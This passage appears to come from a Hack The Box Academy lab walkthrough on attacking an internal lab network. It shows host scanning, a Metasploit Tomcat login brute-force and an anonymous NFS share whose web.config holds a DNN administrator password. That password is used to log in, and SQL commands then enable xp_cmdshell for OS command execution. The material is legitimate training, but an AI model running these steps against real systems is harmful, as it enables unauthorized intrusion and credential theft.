<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.50</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">128</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">0.642</span> ms
</code></pre>
<p>We could also use Nmap through Proxychains to enumerate hosts in the 172.16.8.0/23 subnet, but it will be very slow and take ages to finish.</p>
<p>Our host discovery yields three additional hosts:</p>
<ul>
<li>172.16.8.3</li>
<li>172.16.8.20</li>
<li>172.16.8.50</li>
</ul>
<p>We can now dig deeper into each of these hosts and see what we turn up.</p>
<hr>
<h3 id="host-enumeration">Host Enumeration</h3>
<p>Let&#39;s continue our enumeration using a static Nmap binary from the dmz01 host. Try uploading the binary using one of the techniques taught in the <a href="https://academy.hackthebox.com/module/24/section/159">File Transfers</a> module.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">
root@dmz01:/tmp# ./<span class="hljs-keyword">nmap</span> --<span class="hljs-keyword">open</span> -iL live_hosts 

Starting Nmap <span class="hljs-number">6.49</span>BETA1 ( http://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">22</span> <span class="hljs-number">01</span>:<span class="hljs-number">42</span> UTC
Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> <span class="hljs-keyword">nmap</span>-services! Resorting <span class="hljs-keyword">to</span> /etc/services
Cannot <span class="hljs-keyword">find</span> <span class="hljs-keyword">nmap</span>-payloads. UDP payloads are disabled.

Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>
Cannot <span class="hljs-keyword">find</span> <span class="hljs-keyword">nmap</span>-mac-prefixe<span class="hljs-variable">s:</span> Ethernet vendor correlation will not <span class="hljs-keyword">be</span> performed
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00064</span>s latency).
Not shown: <span class="hljs-number">1173</span> closed ports
PORT    STATE SERVICE
<span class="hljs-number">53</span>/tcp  <span class="hljs-keyword">open</span>  domain
<span class="hljs-number">88</span>/tcp  <span class="hljs-keyword">open</span>  kerberos
<span class="hljs-number">135</span>/tcp <span class="hljs-keyword">open</span>  epmap
<span class="hljs-number">139</span>/tcp <span class="hljs-keyword">open</span>  netbios-ssn
<span class="hljs-number">389</span>/tcp <span class="hljs-keyword">open</span>  ldap
<span class="hljs-number">445</span>/tcp <span class="hljs-keyword">open</span>  microsoft-<span class="hljs-keyword">ds</span>
<span class="hljs-number">464</span>/tcp <span class="hljs-keyword">open</span>  kpasswd
<span class="hljs-number">593</span>/tcp <span class="hljs-keyword">open</span>  unknown
<span class="hljs-number">636</span>/tcp <span class="hljs-keyword">open</span>  ldaps
MAC Addres<span class="hljs-variable">s:</span> <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:B9:<span class="hljs-number">16</span>:<span class="hljs-number">51</span> (Unknown)

Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">8.20</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00037</span>s latency).
Not shown: <span class="hljs-number">1175</span> closed ports
PORT     STATE SERVICE
<span class="hljs-number">80</span>/tcp   <span class="hljs-keyword">open</span>  http
<span class="hljs-number">111</span>/tcp  <span class="hljs-keyword">open</span>  sunrpc
<span class="hljs-number">135</span>/tcp  <span class="hljs-keyword">open</span>  epmap
<span class="hljs-number">139</span>/tcp  <span class="hljs-keyword">open</span>  netbios-ssn
<span class="hljs-number">445</span>/tcp  <span class="hljs-keyword">open</span>  microsoft-<span class="hljs-keyword">ds</span>
<span class="hljs-number">2049</span>/tcp <span class="hljs-keyword">open</span>  nfs
<span class="hljs-number">3389</span>/tcp <span class="hljs-keyword">open</span>  ms-wbt-server
MAC Addres<span class="hljs-variable">s:</span> <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:B9:EC:<span class="hljs-number">36</span> (Unknown)

Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">8.50</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00038</span>s latency).
Not shown: <span class="hljs-number">1177</span> closed ports
PORT     STATE SERVICE
<span class="hljs-number">135</span>/tcp  <span class="hljs-keyword">open</span>  epmap
<span class="hljs-number">139</span>/tcp  <span class="hljs-keyword">open</span>  netbios-ssn
<span class="hljs-number">445</span>/tcp  <span class="hljs-keyword">open</span>  microsoft-<span class="hljs-keyword">ds</span>
<span class="hljs-number">3389</span>/tcp <span class="hljs-keyword">open</span>  ms-wbt-server
<span class="hljs-number">8080</span>/tcp <span class="hljs-keyword">open</span>  http-alt
MAC Addres<span class="hljs-variable">s:</span> <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:B9:B0:<span class="hljs-number">89</span> (Unknown)

Nmap done: <span class="hljs-number">3</span> IP addresses (<span class="hljs-number">3</span> hosts <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">131.36</span> second
</code></pre>
<p>From the Nmap output, we can gather the following:</p>
<ul>
<li>172.16.8.3 is a Domain Controller because we see open ports such as Kerberos and LDAP. We can likely leave this to the side for now as its unlikely to be directly exploitable (though we can come back to that)</li>
<li>172.16.8.20 is a Windows host, and the ports <code>80/HTTP</code> and <code>2049/NFS</code> are particularly interesting</li>
<li>172.16.8.50 is a Windows host as well, and port <code>8080</code> sticks out as non-standard and interesting</li>
</ul>
<p>We could run a full TCP port scan in the background while digging into some of these hosts.</p>
<hr>
<h3 id="active-directory-quick-hits-smb-null-session">Active Directory Quick Hits - SMB NULL SESSION</h3>
<p>We can quickly check against the Domain Controller for SMB NULL sessions. If we can dump the password policy and a user list, we could try a measured password spraying attack. If we know the password policy, we can time our attacks appropriately to avoid account lockout. If we can&#39;t find anything else, we could come back and use <code>Kerbrute</code> to enumerate valid usernames from various user lists and after enumerating (during a real pentest) potential usernames from the company&#39;s LinkedIn page. With this list in hand, we could try 1-2 spraying attacks and hope for a hit. If that still does not work, depending on the client and assessment type, we could ask them for the password policy to avoid locking out accounts. We could also try an ASREPRoasting attack if we have valid usernames, as discussed in the <code>Active Directory Enumeration &amp; Attacks</code> module.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3

ProxyChains-3.1 (http://proxychains.sf.net)
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 21 21:49:47 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.8.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 172.16.8.3    |
 ================================================== 
[E] Can't find workgroup/domain


 =================================== 
|    Session <span class="hljs-keyword">Check</span> <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>    |
 =================================== 
<span class="hljs-keyword">Use</span> <span class="hljs-keyword">of</span> uninitialized <span class="hljs-keyword">value</span> $global_workgroup <span class="hljs-keyword">in</span> concatenation (.) <span class="hljs-keyword">or</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">at</span> ./enum4linux.pl line <span class="hljs-number">437.</span>
[+] <span class="hljs-keyword">Server</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span> allows sessions <span class="hljs-keyword">using</span> username <span class="hljs-string">''</span>, <span class="hljs-keyword">password</span> <span class="hljs-string">''</span>
<span class="hljs-keyword">Use</span> <span class="hljs-keyword">of</span> uninitialized <span class="hljs-keyword">value</span> $global_workgroup <span class="hljs-keyword">in</span> concatenation (.) <span class="hljs-keyword">or</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">at</span> ./enum4linux.pl line <span class="hljs-number">451.</span>
[+] Got <span class="hljs-keyword">domain</span>/workgroup <span class="hljs-keyword">name</span>: 

 ========================================= 
|    Getting <span class="hljs-keyword">domain</span> <span class="hljs-keyword">SID</span> <span class="hljs-keyword">for</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>    |
 ========================================= 
<span class="hljs-keyword">Use</span> <span class="hljs-keyword">of</span> uninitialized <span class="hljs-keyword">value</span> $global_workgroup <span class="hljs-keyword">in</span> concatenation (.) <span class="hljs-keyword">or</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">at</span> ./enum4linux.pl line <span class="hljs-number">359.</span>
|S-<span class="hljs-keyword">chain</span>|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
<span class="hljs-keyword">Domain</span> <span class="hljs-keyword">Name</span>: INLANEFREIGHT
<span class="hljs-keyword">Domain</span> <span class="hljs-keyword">Sid</span>: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2814148634</span><span class="hljs-number">-3729814499</span><span class="hljs-number">-1637837074</span>
[+] Host <span class="hljs-keyword">is</span> part <span class="hljs-keyword">of</span> a <span class="hljs-keyword">domain</span> (<span class="hljs-keyword">not</span> a workgroup)

 =========================== 
|    <span class="hljs-keyword">Users</span> <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>    |
 =========================== 
<span class="hljs-keyword">Use</span> <span class="hljs-keyword">of</span> uninitialized <span class="hljs-keyword">value</span> $global_workgroup <span class="hljs-keyword">in</span> concatenation (.) <span class="hljs-keyword">or</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">at</span> ./enum4linux.pl line <span class="hljs-number">866.</span>
[E] Couldn<span class="hljs-string">'t find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn'</span>t find <span class="hljs-keyword">users</span> <span class="hljs-keyword">using</span> enumdomusers: NT_STATUS_ACCESS_DENIED

 ================================================== 
|    <span class="hljs-keyword">Password</span> <span class="hljs-keyword">Policy</span> Information <span class="hljs-keyword">for</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>    |
 ================================================== 
[E] Unexpected <span class="hljs-keyword">error</span> <span class="hljs-keyword">from</span> polenum:
|S-<span class="hljs-keyword">chain</span>|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">139</span>-&lt;&gt;&lt;&gt;-OK
|S-<span class="hljs-keyword">chain</span>|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK


[+] Attaching <span class="hljs-keyword">to</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span> <span class="hljs-keyword">using</span> a <span class="hljs-literal">NULL</span> <span class="hljs-keyword">share</span>

[+] Trying protocol <span class="hljs-number">139</span>/SMB...

    [!] Protocol <span class="hljs-keyword">failed</span>: Cannot request <span class="hljs-keyword">session</span> (Called <span class="hljs-keyword">Name</span>:<span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>)

[+] Trying protocol <span class="hljs-number">445</span>/SMB...

    [!] Protocol <span class="hljs-keyword">failed</span>: SAMR SessionError: code: <span class="hljs-number">0xc0000022</span> - STATUS_ACCESS_DENIED - {<span class="hljs-keyword">Access</span> Denied} A process has requested <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> an <span class="hljs-keyword">object</span> but has <span class="hljs-keyword">not</span> been granted those <span class="hljs-keyword">access</span> rights.

<span class="hljs-keyword">Use</span> <span class="hljs-keyword">of</span> uninitialized <span class="hljs-keyword">value</span> $global_workgroup <span class="hljs-keyword">in</span> concatenation (.) <span class="hljs-keyword">or</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">at</span> ./enum4linux.pl line <span class="hljs-number">501.</span>

[E] <span class="hljs-keyword">Failed</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">policy</span> <span class="hljs-keyword">with</span> rpcclient

enum4linux <span class="hljs-keyword">complete</span> <span class="hljs-keyword">on</span> Tue Jun <span class="hljs-number">21</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">07</span> <span class="hljs-number">2022</span>
</code></pre>
<p>Unfortunately for us, this is a dead-end.</p>
<hr>
<h3 id="172-16-8-50-tomcat">172.16.8.50 - Tomcat</h3>
<p>Our earlier Nmap scan showed port 8080 open on this host. Browsing to <code>http://172.16.8.50:8080</code> shows the latest version of Tomcat 10 installed. Though there are no public exploits for it, we can try to brute-force the Tomcat Manager login as shown in the <a href="https://academy.hackthebox.com/module/113/section/1211">Attacking Tomcat</a> section of the <code>Attacking Common Applications</code> module. We can start another instance of Metasploit using Proxychains by typing <code>proxychains msfconsole</code> to be able to pivot through the compromised dmz01 host if we don&#39;t have routing set up via a Meterpreter session. We can then use the <code>auxiliary/scanner/http/tomcat_mgr_login</code> module to attempt to brute-force the login.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set rhosts <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>
rhosts =&gt; <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>
msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set stop_on_success true
stop_on_success =&gt; true
msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK

[!] No active <span class="hljs-built_in">DB</span> -- Credential data will <span class="hljs-keyword">not</span> be saved!
[-] <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span> - LOGIN FAILED: admin:admin (Incorrect)
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
[-] <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span> - LOGIN FAILED: admin:manager (Incorrect)
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
[-] <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span> - LOGIN FAILED: admin:role1 (Incorrect)

&lt;SNIP&gt;

|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
[-] <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.50</span>:<span class="hljs-number">8080</span> - LOGIN FAILED: tomcat:changethis (Incorrect)
[*] Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
[*] Auxiliary module execution completed
</code></pre>
<p>We do not get a successful login, so this appears to be a dead-end and not worth exploring further. If we came across a Tomcat Manager login page exposed to the internet, we&#39;d probably want to record it as a finding since an attacker could potentially brute-force it and use it to obtain a foothold. During an internal, we would only want to report it if we could get in via weak credentials and upload a JSP web shell. Otherwise, seeing on an internal network is normal if it is well locked down.</p>
<hr>
<h3 id="enumerating-172-16-8-20-dotnetnuke-dnn-">Enumerating 172.16.8.20 - DotNetNuke (DNN)</h3>
<p>From the Nmap scan, we saw ports <code>80</code> and <code>2049</code> open. Let&#39;s dig into each of these. We can check out what&#39;s on port 80 using <code>cURL</code> from our attack host using the command <code>proxychains curl http://172.16.8.20</code>. From the HTTP response, it looks like <a href="https://www.dnnsoftware.com/">DotNetNuke (DNN)</a> is running on the target. This is a CMS written in .NET, basically the WordPress of .NET. It has suffered from a few critical flaws over the years and also has some built-in functionality that we may be able to take advantage of. We can confirm this by browsing directly to the target from our attack host, passing the traffic through the SOCKS proxy.</p>
<p>We can set this up in Firefox as follows:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/ff\_socks.png" alt="text"></p>
<p>Browsing to the page confirms our suspicions.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/dnn\_homepage.png" alt="text"></p>
<p>Browsing to <code>http://172.16.8.20/Login?returnurl=%2fadmin</code> shows us the admin login page. There is also a page to register a user. We attempt to register an account but receive the message:</p>
<p><code>An email with your details has been sent to the Site Administrator for verification. You will be notified by email when your registration has been approved. In the meantime you can continue to browse this site.</code></p>
<p>In my experience, it is highly unlikely that any type of site administrator will approve a strange registration, though it&#39;s worth trying to cover all of our bases.</p>
<p>Putting DNN aside, for now, we go back to our port scan results. Port 2049, NFS, is always interesting to see. If the NFS server is misconfigured (which they often are internally), we can browse NFS shares and potentially uncover some sensitive data. As this is a development server (due to the in-process DNN installation and the <code>DEV01</code> hostname) so it&#39;s worth digging into. We can use <a href="https://linux.die.net/man/8/showmount">showmount</a> to list exports, which we may be able to mount and browse similar to any other file share. We find one export, <code>DEV01</code>, that is accessible to everyone (anonymous access). Let&#39;s see what it holds.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains showmount -e <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>:<span class="hljs-number">111</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>:<span class="hljs-number">2049</span>-&lt;&gt;&lt;&gt;-OK
Export list for <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>:
/DEV01 (everyone)
</code></pre>
<p>We can&#39;t mount the NFS share through Proxychains, but luckily we have root access to the dmz01 host to try. We see a few files related to DNN and a <code>DNN</code> subdirectory.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># mkdir DEV01</span>
root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01</span>
root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># cd DEV01/</span>
root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp/DEV01</span><span class="hljs-comment"># ls</span>

BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml
</code></pre>
<p>The <code>DNN</code> subdirectory is very interesting as it contains a <code>web.config</code> file. From our discussions on pillaging throughout the <code>Penetration Tester Path</code>, we know that config files can often contain credentials, making them a key target during any assessment.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp/DEV01</span><span class="hljs-comment"># cd DNN</span>
root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp/DEV01/DNN</span><span class="hljs-comment"># ls</span>

App_LocalResources                CKHtmlEditorProvider.cs  Options.aspx                 Web
Browser                           Constants                Options.aspx.cs              web.config
bundleconfig.json                 Content                  Options.aspx.designer.cs     web.Debug.config
CKEditorOptions.ascx              Controls                 packages.config              web.Deploy.config
CKEditorOptions.ascx.cs           Extensions               Properties                   web.Release.config
CKEditorOptions.ascx.designer.cs  Install                  UrlControl.ascx
CKEditorOptions.ascx.resx         Module                   Utilities
CKFinder                          Objects                  WatchersNET.CKEditor.csproj

root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp/DEV01/DNN</span><span class="hljs-comment">#</span>
</code></pre>
<p>Checking the contents of the web.config file, we find what appears to be the administrator password for the DNN instance.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@dmz01:/tmp/DEV01/DNN# cat web.config 

<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
  <span class="hljs-comment">&lt;!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the &lt;httpRuntime&gt; tag.
      &lt;system.Web&gt;
        &lt;httpRuntime targetFramework="4.6.2" /&gt;
      &lt;/system.Web&gt;
  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>D0tn31Nuk3R0ck$$@123<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">system.web</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">compilation</span> <span class="hljs-attr">debug</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">targetFramework</span>=<span class="hljs-string">"4.5.2"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">httpRuntime</span> <span class="hljs-attr">targetFramework</span>=<span class="hljs-string">"4.5.2"</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">system.web</span>&gt;</span>
</code></pre>
<p>Before we move on, since we have root access on <code>dmz01</code> via SSH, we can run <code>tcpdump</code> as it&#39;s on the system. It can never hurt to &quot;listen on the wire&quot; whenever possible during a pentest and see if we can grab any cleartext credentials or generally uncover any additional information that may be useful for us. We&#39;ll typically do this during an Internal Penetration Test when we have our own physical laptop or a VM that we control inside the client&#39;s network. Some testers will run a packet capture the entire time (rarely, clients will even request this), while others will run it periodically during the first day or so to see if they can capture anything.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@dmz01:/tmp<span class="hljs-comment"># tcpdump -i ens192 -s 65535 -w ilfreight_pcap</span>

tcpdump: listening <span class="hljs-keyword">on</span> <span class="hljs-title">ens192</span>, <span class="hljs-title">link-type</span> <span class="hljs-title">EN10MB</span> (<span class="hljs-title">Ethernet</span>), <span class="hljs-title">capture</span> <span class="hljs-title">size</span> <span class="hljs-title">65535</span> <span class="hljs-title">bytes</span>
^C2027 packets captured
<span class="hljs-number">2033</span> packets received <span class="hljs-keyword">by</span> <span class="hljs-built_in">filter</span>
<span class="hljs-number">0</span> packets dropped <span class="hljs-keyword">by</span> kernel
</code></pre>
<p>We could now transfer this down to our host and open it in <code>Wireshark</code> to see if we were able to capture anything. This is covered briefly in the <a href="https://academy.hackthebox.com/module/67/section/630">Interacting with Users</a> section of the <code>Windows Privilege Escalation</code> module. For a more in-depth study, consult the <a href="https://academy.hackthebox.com/module/details/81">Intro to Network Traffic Analysis</a> module.</p>
<p>After transferring the file down to our host, we open it in Wireshark but see that nothing was captured. If we were on a user VLAN or other &quot;busy&quot; area of the network, we might have considerable data to dig through, so it&#39;s always worth a shot.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>At this point, we have dug into the other &quot;live&quot; hosts we can reach and attempted to sniff network traffic. We could run a full port scan of these hosts as well, but we have plenty to move forward with for now. Let&#39;s see what we can do with the DNN credentials we obtained from the <code>web.config</code> file pillaged from the open NFS share.</p>
<h2 id="exploitation-privilege-escalation">Exploitation &amp; Privilege Escalation</h2>
<hr>
<p>At this point, we have moved from the <code>Information Gathering</code> and <code>Vulnerability Assessment</code> stages into the <code>Exploitation</code> stage of the Penetration Testing Process. After obtaining a foothold, we enumerated what hosts were available to us, scanned for open ports, and probed the accessible services.</p>
<hr>
<h3 id="attacking-dnn">Attacking DNN</h3>
<p>Let&#39;s head over to DNN and try our luck with the credential pair <code>Administrator:D0tn31Nuk3R0ck$$@123</code>. This is a success; we are logged in as the SuperUser administrator account. Here we would want to record another two high-risk findings: <code>Insecure File Shares</code> and <code>Sensitive Data on File Shares</code>. We could potentially combine these into one, but it&#39;s worth highlighting as separate issues because if the client restricts anonymous access, but all Domain Users can still access the share and see data that is not necessary for their day-to-day work, then there is a still a risk present.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/dnn\_logged\_in.png" alt="text"></p>
<p>A SQL console is accessible under the <code>Settings</code> page where we can enable <code>xp_cmdshell</code> and run operating system commands. We can first enable this by pasting these lines into the console one by one and clicking <code>Run Script</code>. We won&#39;t get any output from each command, but no errors typically means it&#39;s working.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-string">'1'</span>
RECONFIGURE
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-string">'1'</span> 
RECONFIGURE
</code></pre>
<p>If this works, we can run operating system commands in the format <code>xp_cmdshell &#39;&lt;command here&gt;&#39;</code>. We could then use this to obtain a reverse shell or work on privilege escalation.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/sql\_commands.png" alt="text"></p>
